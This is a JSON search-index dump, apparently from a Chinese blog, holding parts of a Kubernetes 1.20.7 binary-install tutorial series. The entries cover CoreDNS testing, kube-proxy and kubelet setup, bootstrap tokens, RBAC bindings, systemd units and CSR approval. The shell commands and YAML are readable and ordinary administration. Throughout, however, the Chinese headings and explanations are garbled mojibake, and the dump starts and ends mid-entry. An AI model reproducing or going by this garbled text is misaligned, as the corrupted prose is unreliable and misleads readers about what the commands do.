è¿è¡Œä¸€ä¸ªpodï¼Œæµ‹è¯•é€šè¿‡serviceè®¿é—®æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„my-pod1 kubectl run svc-test --image=busybox -it --rm --command -- sh wget -O - -o /dev/null my-pod1 95421-1tuh8msyjrg.png ","date":"2021-06-28 10:44","objectID":"/post/2523/:0:3","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-corednså®‰è£…(åä¸‰)","uri":"/post/2523/"},{"categories":["kubernetes"],"content":"ä¸€ã€å®‰è£…kubelet # å®‰è£…kubelet for i in {201..203};do scp /server/packages/kubernetes/server/bin/kube-proxy root@172.17.20.$i:/usr/local/bin/ ;done for i in {210..212};do scp /server/packages/kubernetes/server/bin/kube-proxy root@172.17.20.$i:/usr/local/bin/ ;done ","date":"2021-06-23 16:29","objectID":"/post/2505/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kube-proxyå®‰è£…(åä¸€)","uri":"/post/2505/"},{"categories":["kubernetes"],"content":"äºŒã€é…ç½®kube-config masterèŠ‚ç‚¹æ‰§è¡Œ cd /etc/kubernetes/ # è®¾ç½®é›†ç¾¤ä¿¡æ¯ kubectl config set-cluster kubernetes --kubeconfig=kube-proxy.conf --server=https://172.17.20.200:6443 --certificate-authority=/etc/kubernetes/pki/ca/ca.pem --embed-certs=true # è®¾ç½®ç”¨æˆ·ä¿¡æ¯ kubectl config set-credentials kube-proxy --kubeconfig=kube-proxy.conf --client-certificate=/etc/kubernetes/pki/kube-proxy.pem --client-key=/etc/kubernetes/pki/kube-proxy-key.pem --embed-certs=true # è®¾ç½®ä¸Šä¸‹æ–‡ kubectl config set-context kube-proxy --kubeconfig=kube-proxy.conf --cluster=kubernetes --user=kube-proxy # è®¾ç½®é»˜è®¤ä¸Šä¸‹æ–‡ kubectl config use-context kube-proxy --kubeconfig=kube-proxy.conf # åˆ†å‘åˆ°å…¶ä»–èŠ‚ç‚¹ for i in 202 203 210 211 212;do scp /etc/kubernetes/kube-proxy.conf 172.17.20.$i:/etc/kubernetes/ ;done ","date":"2021-06-23 16:29","objectID":"/post/2505/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kube-proxyå®‰è£…(åä¸€)","uri":"/post/2505/"},{"categories":["kubernetes"],"content":"ä¸‰ã€kube-proxyé…ç½®æ–‡ä»¶ cat \u003e /etc/kubernetes/kube-proxy.yaml \u003c\u003cEOF apiVersion: kubeproxy.config.k8s.io/v1alpha1 kind: KubeProxyConfiguration bindAddress: 0.0.0.0 healthzBindAddress: 0.0.0.0:10256 metricsBindAddress: 0.0.0.0:10249 bindAddressHardFail: true enableProfiling: false clusterCIDR: 10.244.0.0/16 hostnameOverride: 172.17.20.201 clientConnection: kubeconfig: /etc/kubernetes/kube-proxy.conf qps: 100 burst: 200 mode: \"ipvs\" EOF # åˆ†å‘åˆ°å…¶ä»–æœºå™¨ for i in 202 203 210 211 212;do scp /etc/kubernetes/kube-proxy.yaml 172.17.20.$i:/etc/kubernetes/ ;done # ä¿®æ”¹hostnameOverrideä¿¡æ¯ for i in 202 203 210 211 212;do ssh 172.17.20.$i 'sed -i \"s#hostnameOverride.*#hostnameOverride: $(ip a s eth0 | grep -o 172\\.17\\.20.*/ | tr -d /)#\" /etc/kubernetes/kube-proxy.yaml' ;done å‚æ•°è¯´æ˜: bindAddress: ç›‘å¬åœ°å€ healthzBindAddress: å¥åº·æ£€æŸ¥æœåŠ¡çš„ç›‘å¬åœ°å€å’Œç«¯å£ï¼Œé»˜è®¤0.0.0.0:10256 metricsBindAddress: metricsæŒ‡æ ‡æœåŠ¡çš„ç›‘å¬åœ°å€å’Œç«¯å£ï¼Œé»˜è®¤127.0.0.1:10249 bindAddressHardFail: ç«¯å£ç»‘å®šå¤±è´¥è§†ä¸ºä¸¥é‡é”™è¯¯ï¼Œç›´æ¥é€€å‡ºç¨‹åº enableProfiling: å¯ç”¨æ€§èƒ½åˆ†æ clusterCIDR: podçš„ipèŒƒå›´ hostnameOverride: å‚æ•°å€¼å¿…é¡»ä¸ kubelet çš„å€¼ä¸€è‡´ï¼Œå¦åˆ™ kube-proxy å¯åŠ¨åä¼šæ‰¾ä¸åˆ°è¯¥ Nodeï¼Œä»è€Œä¸ä¼šåˆ›å»ºä»»ä½• ipvs è§„åˆ™ clientConnection: kube-proxyå®¢æˆ·ç«¯çš„é…ç½® kubeconfig: kubeconfigæ–‡ä»¶è·¯å¾„ qps: æ¯ç§’å…è®¸çš„æŸ¥è¯¢æ•° burst: ä¸apiserveré€šä¿¡æ—¶çš„å¹¶å‘æ•° mode: ä½¿ç”¨çš„ç½‘ç»œä»£ç†æ¨¡å¼ï¼Œå¯é€‰é¡¹userspaceã€iptablesã€ipvs ","date":"2021-06-23 16:29","objectID":"/post/2505/:0:3","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kube-proxyå®‰è£…(åä¸€)","uri":"/post/2505/"},{"categories":["kubernetes"],"content":"å››ã€é…ç½®systemdå¯åŠ¨è„šæœ¬ cat \u003e /etc/systemd/system/kube-proxy.service \u003c\u003cEOF [Unit] Description=Kubernetes Kube-Proxy Server Documentation=https://github.com/GoogleCloudPlatform/kubernetes After=network.target [Service] ExecStart=/usr/local/bin/kube-proxy \\\\ --config=/etc/kubernetes/kube-proxy.yaml \\\\ --logtostderr=false \\\\ --log-file=/var/log/kube-proxy.log \\\\ --v=2 Restart=on-failure RestartSec=5 LimitNOFILE=65536 [Install] WantedBy=multi-user.target EOF # åˆ†å‘åˆ°å…¶ä»–æœºå™¨ for i in 202 203 210 211 212;do scp /etc/systemd/system/kube-proxy.service 172.17.20.$i:/etc/systemd/system/ ;done ","date":"2021-06-23 16:29","objectID":"/post/2505/:0:4","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kube-proxyå®‰è£…(åä¸€)","uri":"/post/2505/"},{"categories":["kubernetes"],"content":"äº”ã€å¯åŠ¨æœåŠ¡ systemctl start kube-proxy systemctl enable kube-proxy ","date":"2021-06-23 16:29","objectID":"/post/2505/:0:5","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kube-proxyå®‰è£…(åä¸€)","uri":"/post/2505/"},{"categories":["kubernetes"],"content":"å…­ã€æŸ¥çœ‹çŠ¶æ€ for i in 201 202 203 210 211 212;do echo -e \"172.17.20.$i:\" ;ssh 172.17.20.$i 'systemctl status kube-proxy|grep Active' ;done 08048-t8btv6tuquh.png ","date":"2021-06-23 16:29","objectID":"/post/2505/:0:6","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kube-proxyå®‰è£…(åä¸€)","uri":"/post/2505/"},{"categories":["kubernetes"],"content":"ä¸€ã€å®‰è£…kubelet # masterèŠ‚ç‚¹æ‰§è¡Œ # è¿œç¨‹åˆ›å»ºç›®å½•ï¼Œåˆ›å»ºmanifestsçš„ç›®çš„æ˜¯é¢„ç•™ä¸€ä¸ªé™æ€podç›®å½•ï¼Œç›®å‰æš‚æ—¶è¿˜ç”¨ä¸åˆ°ã€‚ for i in {201..203};do ssh 172.17.20.$i mkdir /etc/kubernetes/{manifests,pki} /etc/kubernetes/pki/ca -p ;done for i in {210..212};do ssh 172.17.20.$i mkdir /etc/kubernetes/{manifests,pki} /etc/kubernetes/pki/ca -p ;done # å¤åˆ¶CAæ ¹è¯ä¹¦ for i in {210..212};do scp /etc/kubernetes/pki/ca/ca.pem 172.17.20.$i:/etc/kubernetes/pki/ca/ ;done # å®‰è£…kubelet for i in {201..203};do scp /server/packages/kubernetes/server/bin/kubelet root@172.17.20.$i:/usr/local/bin/kubelet ;done for i in {210..212};do scp /server/packages/kubernetes/server/bin/kubelet root@172.17.20.$i:/usr/local/bin/kubelet ;done ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:1","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kubeletå®‰è£…(å)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"äºŒã€ç”Ÿæˆkubeconfigæ–‡ä»¶ masterèŠ‚ç‚¹æ‰§è¡Œ # è®¾ç½®é›†ç¾¤ä¿¡æ¯ kubectl config set-cluster kubernetes --kubeconfig=kubelet-bootstrap.conf --server=https://172.17.20.200:6443 --certificate-authority=/etc/kubernetes/pki/ca/ca.pem --embed-certs=true # è®¾ç½®ç”¨æˆ·ä¿¡æ¯ï¼Œä¹‹å‰ç”¨çš„æ˜¯è¯ä¹¦ï¼Œç°åœ¨è¿™é‡Œç”¨çš„æ˜¯token(è¿™ä¸ªtokenæˆ‘ä»¬åé¢åªèµ‹äºˆä»–åˆ›å»ºcsrè¯·æ±‚çš„æƒé™)ï¼Œkubeletçš„è¯ä¹¦æˆ‘ä»¬äº¤ç»™apiserveræ¥ç®¡ç† kubectl config set-credentials kubelet-bootstrap --kubeconfig=kubelet-bootstrap.conf --token=`sed 's#,.*##' /etc/kubernetes/token.csv` # è®¾ç½®ä¸Šä¸‹æ–‡ä¿¡æ¯ kubectl config set-context kubernetes --kubeconfig=kubelet-bootstrap.conf --cluster=kubernetes --user=kubelet-bootstrap # è®¾ç½®é»˜è®¤ä¸Šä¸‹æ–‡ kubectl config use-context kubernetes --kubeconfig=kubelet-bootstrap.conf # åˆ†å‘åˆ°nodeèŠ‚ç‚¹ # æˆ‘è¿™é‡ŒmasterèŠ‚ç‚¹ä¹Ÿä½œä¸ºnodeèŠ‚ç‚¹ä½¿ç”¨ for i in {202..203};do scp /etc/kubernetes/kubelet-bootstrap.conf 172.17.20.$i:/etc/kubernetes/ ;done for i in {210..212};do scp /etc/kubernetes/kubelet-bootstrap.conf 172.17.20.$i:/etc/kubernetes/ ;done ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:2","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kubeletå®‰è£…(å)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"ä¸‰ã€åˆ›å»ºClusterRoleBinding 1.æˆ‘ä»¬çš„tokenå±äºsystem::bootstrappersç»„,ä½†æ˜¯ç°åœ¨æ²¡æœ‰åˆ›å»ºCSRçš„æƒé™ï¼Œæ‰€ä»¥ç°åœ¨éœ€è¦å’ŒClusterRole(system:node-bootstrapper)ç»‘å®šï¼Œè¿™ä¸ªClusterRoleæ˜¯åŒ…å«certificatesigningrequestsæƒé™çš„ã€‚ä¸‹é¢åœ¨masterèŠ‚ç‚¹æ‰§è¡Œ cat \u003c\u003cEOF | kubectl apply -f - apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: create-csrs-for-bootstrapping subjects: - kind: Group name: system:bootstrappers apiGroup: rbac.authorization.k8s.io roleRef: kind: ClusterRole name: system:node-bootstrapper apiGroup: rbac.authorization.k8s.io EOF 2.å½“apiserverè®¿é—®kubeletæ—¶(logsã€execç­‰æ“ä½œ),kubeletä¹Ÿéœ€è¦å¯¹å®¢æˆ·ç«¯è¿›è¡Œè®¤è¯,k8sä¸­å†…ç½®äº†ä¸€ä¸ªsystem:kubelet-api-adminçš„è§’è‰²ï¼Œæˆ‘ä»¬å°†å®ƒå’Œapiserverè¯ä¹¦ä¸­çš„CNå­—æ®µç»‘å®šï¼Œå³å’Œkubernetesç”¨æˆ·è¿›è¡Œç»‘å®š,è¿™æ ·apiserverå¯¹kubeletå°±æœ‰äº†è®¿é—®æƒé™ï¼Œä¸‹é¢åŒæ ·åœ¨masterèŠ‚ç‚¹æ‰§è¡Œ cat \u003c\u003cEOF | kubectl apply -f - apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: kube-apiserver-kubelet-apis-admin roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: system:kubelet-api-admin subjects: - apiGroup: rbac.authorization.k8s.io kind: User name: kubernetes EOF ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:3","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kubeletå®‰è£…(å)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"å››ã€é…ç½®kubeletå‚æ•° å…³äºé…ç½®: https://kubernetes.io/zh/docs/tasks/administer-cluster/kubelet-config-file/ KubeletConfiguration: https://v1-20.docs.kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration cat \u003e /etc/kubernetes/kubelet.yaml \u003c\u003cEOF apiVersion: kubelet.config.k8s.io/v1beta1 kind: KubeletConfiguration enableServer: true staticPodPath: /etc/kubernetes/manifests syncFrequency: 1m fileCheckFrequency: 20s address: 0.0.0.0 port: 10250 readOnlyPort: 0 rotateCertificates: true serverTLSBootstrap: true authentication: anonymous: enabled: false webhook: cacheTTL: 0s enabled: true x509: clientCAFile: /etc/kubernetes/pki/ca/ca.pem authorization: mode: Webhook healthzPort: 10248 healthzBindAddress: 0.0.0.0 clusterDomain: cluster.local clusterDNS: # é…ç½®è¿™ä¸ªä¸ºé¢„ç•™ï¼ŒåæœŸéƒ¨ç½²core-dnså°†ä½¿ç”¨è¿™ä¸ªåœ°å€ - 10.1.0.10 nodeStatusUpdateFrequency: 10s nodeStatusReportFrequency: 1m imageMinimumGCAge: 2m imageGCHighThresholdPercent: 80 imageGCLowThresholdPercent: 75 volumeStatsAggPeriod: 1m cgroupDriver: systemd runtimeRequestTimeout: 2m maxPods: 200 kubeAPIQPS: 5 kubeAPIBurst: 10 serializeImagePulls: false evictionHard: memory.available: \"100Mi\" nodefs.available: \"10%\" nodefs.inodesFree: \"5%\" imagefs.available: \"15%\" containerLogMaxSize: 10Mi containerLogMaxFiles: 8 EOF # åˆ†å‘åˆ°å…¶ä»–èŠ‚ç‚¹ for i in {202..203};do scp /etc/kubernetes/kubelet.yaml 172.17.20.$i:/etc/kubernetes/ ;done for i in {210..212};do scp /etc/kubernetes/kubelet.yaml 172.17.20.$i:/etc/kubernetes/ ;done å‚æ•°è¯´æ˜: enableServer: å¯åŠ¨kubeletçš„http rest serverï¼Œè¿™ä¸ªserveræä¾›äº†è·å–æœ¬åœ°èŠ‚ç‚¹è¿è¡Œçš„podåˆ—è¡¨ã€çŠ¶æ€ä»¥åŠå…¶ä»–ç›‘æ§ç›¸å…³çš„restæ¥å£ï¼Œé»˜è®¤trueã€‚ staticPodPath: é™æ€podç›®å½• syncFrequency: åŒæ­¥è¿è¡Œä¸­å®¹å™¨çš„é…ç½®çš„é¢‘ç‡,é»˜è®¤1m fileCheckFrequency: æ£€æŸ¥é™æ€Podçš„æ—¶é—´é—´éš”,é»˜è®¤20s address: ç›‘å¬åœ°å€ï¼Œé»˜è®¤0.0.0.0 port: ç›‘å¬ç«¯å£ï¼Œé»˜è®¤10250 readOnlyPort: ä¸€ä¸ªæä¾›åªè¯»æœåŠ¡çš„ç«¯å£ï¼Œ0ä¸ºç¦ç”¨ã€‚ rotateCertificates: å¯ç”¨å®¢æˆ·ç«¯è¯ä¹¦è½®æ¢ã€‚ Kubeletå°†ä»certificates.k8s.io APIè¯·æ±‚æ–°è¯ä¹¦ã€‚ serverTLSBootstrap: å¯ç”¨æœåŠ¡å™¨è¯ä¹¦å¼•å¯¼ã€‚ ä»certificates.k8s.io APIè¯·æ±‚è¯ä¹¦ï¼Œéœ€è¦æ‰¹å‡†è€…æ‰¹å‡†è¯ä¹¦ç­¾åè¯·æ±‚ã€‚è¿™å¿…é¡»å¯ç”¨RotateKubeletServerCertificateç‰¹æ€§ï¼Œé»˜è®¤æ˜¯å¯ç”¨çš„ã€‚ authentication: kubeletå¯¹å®¢æˆ·ç«¯çš„è®¤è¯æ–¹å¼ anonymous: åŒ¿åè®¤è¯ webhook: webhookè®¤è¯æ–¹å¼ cacheTTL : è®¤è¯ç»“æœç¼“å­˜ x509: x509è¯ä¹¦è®¤è¯ clientCAFile: è¯·æ±‚kubeletæœåŠ¡ç«¯çš„å®¢æˆ·ç«¯ï¼Œè¿™é‡ŒæŒ‡å®šç»™å®¢æˆ·ç«¯è¯ä¹¦ç­¾å‘çš„CAæœºæ„ authorization: kubeletå¯¹å®¢æˆ·ç«¯çš„æˆæƒæ–¹å¼ mode: åº”ç”¨äºkubeletæœåŠ¡å™¨è¯·æ±‚çš„æˆæƒæ¨¡å¼ã€‚æœ‰æ•ˆå€¼æ˜¯AlwaysAllowå’ŒWebhookã€‚Webhookæ¨¡å¼ä½¿ç”¨SubjectAccessReview APIæ¥ç¡®å®šæˆæƒã€‚ healthzPort: healthzæ¥å£çš„ç›‘å¬ç«¯å£ healthzBindAddress: healthzæ¥å£çš„ç›‘å¬åœ°å€ clusterDomain: æ­¤é›†ç¾¤çš„DNSåŸŸ clusterDNS: ä¸€ä¸ªDNSåˆ—è¡¨ï¼Œkubeletå°†é…ç½®æ‰€æœ‰å®¹å™¨ä½¿ç”¨æ­¤DNSè§£æï¼Œè€Œä¸æ˜¯ä¸»æœºçš„DNSæœåŠ¡å™¨ã€‚ nodeStatusUpdateFrequency : kubeletå°†èŠ‚ç‚¹çŠ¶æ€ä¿¡æ¯ä¸ŠæŠ¥åˆ°apiserverçš„é¢‘ç‡ï¼Œé»˜è®¤ï¼š10s nodeStatusReportFrequency: kubeletèŠ‚ç‚¹çŠ¶æ€ä¸å˜æ—¶å°†èŠ‚ç‚¹çŠ¶æ€ä¸ŠæŠ¥åˆ°apiserverçš„é¢‘ç‡ã€‚é»˜è®¤ï¼š1m imageMinimumGCAge: é•œåƒåƒåœ¾å›æ”¶æ—¶ï¼Œæ¸…ç†å¤šä¹…æ²¡æœ‰è¢«ä½¿ç”¨çš„é•œåƒï¼Œé»˜è®¤2mã€‚å³2åˆ†é’Ÿå†…æ²¡æœ‰è¢«ä½¿ç”¨è¿‡çš„é•œåƒä¼šè¢«æ¸…ç†ã€‚ imageGCHighThresholdPercent: è®¾ç½®é•œåƒåƒåœ¾å›æ”¶çš„é˜ˆå€¼(ç£ç›˜ç©ºé—´ç™¾åˆ†æ¯”)ï¼Œé»˜è®¤85ã€‚é«˜äºæ­¤å€¼ä¼šè§¦å‘åƒåœ¾å›æ”¶ã€‚ imageGCLowThresholdPercent: è®¾ç½®åœæ­¢é•œåƒåƒåœ¾å›æ”¶çš„é˜ˆå€¼(ç£ç›˜ç©ºé—´ç™¾åˆ†æ¯”)ï¼Œé»˜è®¤80ã€‚ä½äºæ­¤å€¼ä¼šåœæ­¢åƒåœ¾å›æ”¶ã€‚ volumeStatsAggPeriod: è®¡ç®—å’Œç¼“å­˜æ‰€æœ‰Podçš„å·ç£ç›˜ä½¿ç”¨æƒ…å†µçš„é¢‘ç‡ï¼Œé»˜è®¤1m cgroupDriver: kubeletç”¨æ¥æ“çºµcgroupsçš„é©±åŠ¨ç¨‹åºï¼ˆcgroupfsæˆ–systemdï¼‰ runtimeRequestTimeout: æ‰€æœ‰runtimeè¯·æ±‚çš„è¶…æ—¶æ—¶é—´ï¼Œé™¤äº†é•¿æ—¶é—´è¿è¡Œçš„è¯·æ±‚å¦‚pullã€logsã€exec å’Œ attachã€‚é»˜è®¤2m maxPods: æ§åˆ¶kubeletå¯ä»¥è¿è¡Œçš„podæ•°é‡ã€‚é»˜è®¤110 kubeAPIQPS: ä¸apiserveré€šä¿¡çš„qps,é»˜è®¤5 kubeAPIBurst: ä¸apiserveré€šä¿¡æ—¶çš„å¹¶å‘æ•°,é»˜è®¤10 serializeImagePulls: é»˜è®¤trueï¼Œä¸€ä¸ªä¸€ä¸ªæŒ‰é¡ºåºæ‹‰é•œåƒï¼Œdockerå¤§äº1.9ï¼Œå¹¶ä¸”ä¸æ˜¯ä½¿ç”¨aufså­˜å‚¨é©±åŠ¨çš„å»ºè®®æ”¹æˆfalse evictionHard: è®¾ç½®ç¡¬é©±é€podçš„é˜ˆå€¼.https://kubernetes.io/zh/docs/tasks/administer-cluster/out-of-resource/ é»˜è®¤å¦‚ä¸‹: memory.available: â€œ100Miâ€ # å¯ç”¨å†…å­˜ä¸è¶³100Miä¼šé‡‡ç”¨ç¡¬é©±é€pod nodefs.available: â€œ10%â€ # nodefsç©ºé—´ä¸è¶³10%ä¼šé‡‡ç”¨ç¡¬é©±é€pod nodefs.inodesFree: â€œ5%â€ # inodesä¸è¶³5%ä¼šé‡‡ç”¨ç¡¬é©±é€pod imagefs.available: â€œ15%â€ # imagefsç©ºé—´ä¸è¶³15%ä¼šé‡‡ç”¨ç¡¬é©±é€pod containerLogMaxSize: å®¹å™¨æ—¥å¿—è½®æ¢å¤§å°ï¼Œæ»¡è¶³æŒ‡å®šå¤§å°ä¼šè½®æ¢ï¼Œé»˜è®¤10Mi containerLogMaxFiles: å®¹å™¨æ—¥å¿—è½®æ¢ä¿ç•™çš„æœ€å¤§ä¸ªæ•°ï¼Œé»˜è®¤5ä¸ª ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:4","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kubeletå®‰è£…(å)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"äº”ã€åˆ›å»ºsystemdè„šæœ¬æ–‡ä»¶ æ‰€æœ‰nodeèŠ‚ç‚¹æ‰§è¡Œ,æ³¨æ„éœ€è¦ä¿®æ”¹â€“hostname-override=å‚æ•°çš„å€¼ cat \u003e /etc/systemd/system/kubelet.service \u003c\u003cEOF [Unit] Description=Kubernetes Kubelet Documentation=https://github.com/GoogleCloudPlatform/kubernetes After=docker.service Requires=docker.service [Service] ExecStart=/usr/local/bin/kubelet \\\\ --bootstrap-kubeconfig=/etc/kubernetes/kubelet-bootstrap.conf \\\\ --cert-dir=/etc/kubernetes/pki/ \\\\ --config=/etc/kubernetes/kubelet.yaml \\\\ --container-runtime=docker \\\\ --network-plugin=cni \\\\ --cni-bin-dir=/opt/cni/bin/ \\\\ --hostname-override=172.17.20.201 \\\\ --kubeconfig=/etc/kubernetes/kubelet.conf \\\\ --pod-infra-container-image=registry.aliyuncs.com/google_containers/pause:3.2 \\\\ --alsologtostderr=true \\\\ --logtostderr=false \\\\ --log-file=/var/log/kubelet.log \\\\ --log-file-max-size=100 \\\\ --v=2 Restart=on-failure RestartSec=5 [Install] WantedBy=multi-user.target EOF å‚æ•°è¯´æ˜: --bootstrap-kubeconfig: ç”¨äºbootstrapå¼•å¯¼å¯åŠ¨çš„kubeconfigæ–‡ä»¶ --cert-dir: è¯ä¹¦ç”³è¯·è¢«æ‰¹å‡†åï¼Œç”¨äºä¿å­˜è¯ä¹¦å’Œç§é’¥çš„è·¯å¾„ --container-runtime: å®¹å™¨è¿è¡Œæ—¶(CRI)ï¼Œdockeræˆ–remote --network-plugin: ç½‘ç»œæ’ä»¶åç§° --cni-bin-dir: CNIæ’ä»¶çš„binç›®å½• --cni-conf-dir: CNIé…ç½®æ–‡ä»¶ç›®å½• --container-runtime-endpoint: å½“container-runtimeä½¿ç”¨remoteæ—¶,æŒ‡å®šå®ƒçš„é€šä¿¡ç«¯ç‚¹ï¼Œé»˜è®¤unix:///var/run/dockershim.sock --docker-endpoint: å½“container-runtimeä½¿ç”¨dockeræ—¶,æŒ‡å®šå®ƒçš„é€šä¿¡ç«¯ç‚¹,é»˜è®¤unix:///var/run/dockershim.sock --hostname-override: ç”¨æ¥é…ç½®è¯¥èŠ‚ç‚¹åœ¨é›†ç¾¤ä¸­æ˜¾ç¤ºçš„ä¸»æœºåï¼Œkubeletè®¾ç½®äº†-â€“hostname-overrideå‚æ•°åï¼Œkube-proxyä¹Ÿéœ€è¦è®¾ç½®ï¼Œå¦åˆ™ä¼šå‡ºç°æ‰¾ä¸åˆ°Nodeçš„æƒ…å†µ --kubeconfig: æŒ‡å®škubeconfigæ–‡ä»¶ã€‚å¯åŠ¨æµç¨‹è¯´æ˜: https://kubernetes.io/zh/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/#bootstrap-initialization --logtostderr: æ—¥å¿—è¾“å‡ºåˆ°stderrè€Œä¸æ˜¯æ–‡ä»¶ã€‚é»˜è®¤true --pod-infra-container-image: æŒ‡å®špauseé•œåƒ ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:5","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kubeletå®‰è£…(å)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"å…­ã€è¯ä¹¦è‡ªåŠ¨æ‰¹å‡†å’Œç»­æœŸ é»˜è®¤æƒ…å†µä¸‹,kubeletå‘apiserverå‘é€è¯ä¹¦è¯·æ±‚å,éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ‰¹å‡†kubectl certificate approve xxx.çœŸæ­£è´Ÿè´£ç­¾å‘è¯ä¹¦çš„æ˜¯kube-controller-manager,ä»–éœ€è¦å¦‚ä¸‹å‚æ•°: cluster-signing-cert-file,cluster-signing-key-file,è¿™ä¸ªæˆ‘ä»¬åœ¨å‰é¢å·²ç»é…ç½®è¿‡äº†ã€‚ è¦å…è®¸kubeletè¯·æ±‚å¹¶æ¥æ”¶è¯ä¹¦(è®¿é—®kube-apiserverçš„å®¢æˆ·ç«¯è¯ä¹¦),å¯ä»¥åˆ›å»ºä¸€ä¸ªClusterRoleBindingå°†å¯åŠ¨å¼•å¯¼èŠ‚ç‚¹æ‰€åœ¨çš„ç»„system:bootstrappersç»‘å®šåˆ°é›†ç¾¤è§’è‰²(ClusterRole)system:certificates.k8s.io:certificatesigningrequests:nodeclientä¸Š: # masterèŠ‚ç‚¹æ‰§è¡Œ cat \u003c\u003cEOF | kubectl apply -f - # è‡ªåŠ¨æ‰¹å‡†\"system:bootstrappers\"ç»„çš„æ‰€æœ‰CSR apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: auto-approve-csrs-for-group subjects: - kind: Group name: system:bootstrappers apiGroup: rbac.authorization.k8s.io roleRef: kind: ClusterRole name: system:certificates.k8s.io:certificatesigningrequests:nodeclient apiGroup: rbac.authorization.k8s.io EOF è¦å…è®¸kubeletå¯¹å®¢æˆ·ç«¯è¯ä¹¦æ‰§è¡Œç»­æœŸæ“ä½œ(å¯¹è®¿é—®kube-apiserverçš„å®¢æˆ·ç«¯è¯ä¹¦ç»­æœŸ)ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªClusterRoleBindingå°†æ­£å¸¸å·¥ä½œçš„èŠ‚ç‚¹æ‰€åœ¨çš„ç»„system:nodesç»‘å®šåˆ°ç»‘å®šåˆ°é›†ç¾¤è§’è‰²(ClusterRole)system:certificates.k8s.io:certificatesigningrequests:selfnodeclientä¸Š: # masterèŠ‚ç‚¹æ‰§è¡Œ cat \u003c\u003cEOF | kubectl apply -f - # è‡ªåŠ¨æ‰¹å‡†\"system:nodes\"ç»„çš„CSRç»­çº¦è¯·æ±‚ apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRoleBinding metadata: name: auto-approve-renewals-for-nodes subjects: - kind: Group name: system:nodes apiGroup: rbac.authorization.k8s.io roleRef: kind: ClusterRole name: system:certificates.k8s.io:certificatesigningrequests:selfnodeclient apiGroup: rbac.authorization.k8s.io EOF åˆ°æ­¤ä¸ºæ­¢ï¼Œkubeletå¯ä»¥åœ¨é¦–æ¬¡å¯åŠ¨æ—¶ç”³è¯·ä¸€ä¸ªè®¿é—®apiserverçš„å®¢æˆ·ç«¯è¯ä¹¦ï¼Œå¹¶å°†å®ƒæ‹¿åˆ°æ‰‹ã€‚ä½†æ˜¯kubeletæœ¬èº«ä¹Ÿéœ€è¦ä¸€ä¸ªæœåŠ¡ç«¯è¯ä¹¦,è¿™éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ¥æ‰¹å‡†,1.20ä¹‹å‰çš„ç‰ˆæœ¬åº”è¯¥å¯ä»¥è‡ªåŠ¨æ‰¹å‡†(æˆ‘æŒ‰ç…§1.19çš„æ–‡æ¡£è¯•äº†ä¸€ä¸‹æ²¡æœ‰æˆåŠŸ)ã€‚å®˜æ–¹å…³äºkubeletæœåŠ¡ç«¯è¯ä¹¦çš„è¯´æ˜:https://v1-20.docs.kubernetes.io/zh/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/#certificate-rotation ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:6","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kubeletå®‰è£…(å)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"ä¸ƒã€å¯åŠ¨æœåŠ¡ # æ‰€æœ‰nodeèŠ‚ç‚¹æ‰§è¡Œ systemctl start kubelet systemctl enable kubelet ","date":"2021-06-22 16:29","objectID":"/post/2493/:0:7","tags":["k8s"],"title":"kubernetes 1.20.7 äºŒè¿›åˆ¶å®‰è£…-kubeletå®‰è£…(å)","uri":"/post/2493/"},{"categories":["kubernetes"],"content":"å…«ã€æ‰¹å‡†kubeletæœåŠ¡ç«¯è¯ä¹¦ æŸ¥çœ‹å®¢æˆ·ç«¯csr,å¯ä»¥çœ‹åˆ°å·²ç»è‡ªåŠ¨æ‰¹å‡†äº† 91213-lidhaws11ye.png ç­‰å¾…ä¸€ä¼šï¼Œå¯ä»¥çœ‹åˆ°æœåŠ¡ç«¯è¯ä¹¦çš„csr 48653-1pm8g7p98eb.png è¿™éœ€è¦æˆ‘ä»¬æ‰‹åŠ¨æ‰¹å‡†ï¼Œå…¶ä»–èŠ‚ç‚¹è¯·è‡ªè¡Œæ“ä½œ 37398-983zndtu1w.png ","date":"2021-06-22 